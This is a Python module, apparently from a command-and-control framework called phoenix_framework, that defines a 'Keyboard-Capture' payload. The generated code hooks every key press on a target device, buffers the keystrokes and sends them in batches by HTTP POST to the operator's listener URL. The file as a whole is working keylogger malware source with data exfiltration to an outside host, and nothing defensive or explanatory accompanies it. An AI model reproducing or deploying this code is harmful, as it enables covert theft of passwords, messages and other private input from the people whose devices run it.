from phoenix_framework.server.modules.base import BaseModule
from phoenix_framework.server.utils.options import (IntegerType, Option,
                                                    OptionPool)


class Module(BaseModule):
    name = "Keyboard-Capture"
    description = "Capture keyboard input"
    options = OptionPool(
        [
            Option(
                name="Max keys",
                _real_name="max_keys",
                description="The maximum number of keys to capture before sending the data",
                type=IntegerType(),
                default=100,
            )
        ]
    )

    def code(cls, device, listener, args):
        return f"""
import keyboard
import requests
import json
import time

keys = []

def send_data(data):
    requests.post("{listener.url}/finish/{device.name}", json=data)

def on_press(key):
    keys.append(key)
    if len(keys) > {args["max_keys"]}:
        send_data(keys)
        keys.clear()

keyboard.on_press(on_press)
"""
